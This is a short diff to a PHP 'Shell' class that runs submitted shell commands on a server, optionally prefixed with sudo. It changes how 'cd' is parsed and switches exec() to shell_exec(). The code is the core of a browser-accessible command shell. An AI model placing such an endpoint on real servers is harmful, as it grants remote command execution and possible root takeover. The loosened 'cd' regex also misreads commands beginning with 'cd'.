@@ -79,12 +79,12 @@ class Shell
     $aliases = self::$aliases;
     $output = '';
     $new_dir = $this->session['cwd'];
-    if (preg_match('@^[[:blank:]]*cd[[:blank:]]*$@', @$command))
+    if (preg_match('@^\s*cd\s*$@', @$command))
     {
-      $this->session['cwd'] = getcwd(); //dirname(__FILE__);
-      chdir($new_dir);
+      $this->session['cwd'] = dirname(__FILE__);
+      return chdir($this->session['cwd']);
     }
-    elseif(preg_match('@^[[:blank:]]*cd[[:blank:]]+([^;]+)$@', @$command, $regs))
+    elseif(preg_match('@^\s*cd\s*([^;]+)$@', @$command, $regs))
     {
       ($regs[1][0] == '/') ? $new_dir = $regs[1] : $new_dir = $this->session['cwd'] . '/' . $regs[1];
       // cosmetics 
@@ -107,7 +107,7 @@ class Shell
     {
       //if($this->session['cwd']!=$new_dir)
       chdir($this->session['cwd']);
-      $output = exec($this->session['sudo'] . $command);
+      $output = shell_exec($this->session['sudo'] . $command);
     }
     if($send_output)
       echo $output;
